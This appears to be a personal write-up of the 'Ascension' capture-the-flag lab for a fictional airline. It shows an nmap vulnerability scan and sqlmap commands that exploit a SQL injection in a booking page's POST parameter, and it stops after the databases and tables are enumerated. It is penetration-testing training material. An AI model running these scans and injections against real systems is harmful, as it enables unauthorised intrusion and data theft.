# Ascension
#endgame

### Description: 
    Daedalus Airlines is quickly becoming a major player in global aviation.

	The pace of growth has meant that the company has accumulated a lot of technical debt. In order to avoid a data breach and potentially putting their supply chain at risk, Daedalus have hired your Cyber Security firm to test their systems.

	Ascension is designed to test your skills in Enumeration, Exploitation, Pivoting, Forest Traversal and Privilege Escalation inside two small Active Directory networks.

	The goal is to gain access to the trusted partner, pivot through the network and compromise two Active Directory forests while collecting several flags along the way. Can you Ascend?

### Entry point: 
    10.13.38.20
### Flags   : `7`
### Points : `195`
---

## Takeoff

```bash
nmap -sC --script vuln -A -T4 10.13.38.20 --open
```

We find it's windows machine with all ms servers and shit.

Going to the site we find a SQLi in one of the pages by entering `'` in one of the search boxes.

on the site `http://10.13.38.20/book-trip.php`

![[Pasted image 20211021125736.png]]

We can see that it is not going through a GET request we have to check for the params in burpsuite and use them in SQLmap.

Params from the Burp POST Request `destination=some&adults=dumb&children=shit`

Checking for vulnerability on sqlmap
```bash
sqlmap -u 'http://10.13.38.20/book-trip.php' --data='destination=some&adults=dumb&children=shit'
```

looks like destination is vulnerable as manually checked let's try to get the dbs and tables and all that juicy data.
```
available databases [6]:  
[*] daedalus  
[*] logs  
[*] master  
[*] model  
[*] msdb  
[*] tempdb
```

```bash
sqlmap -u 'http://10.13.38.20/book-trip.php' --data='destination=some&adults=dumb&children=shit' -p destination --dbs

sqlmap -u 'http://10.13.38.20/book-trip.php' --data='destination=some&adults=dumb&children=shit' -p destination -D msdb --tables
```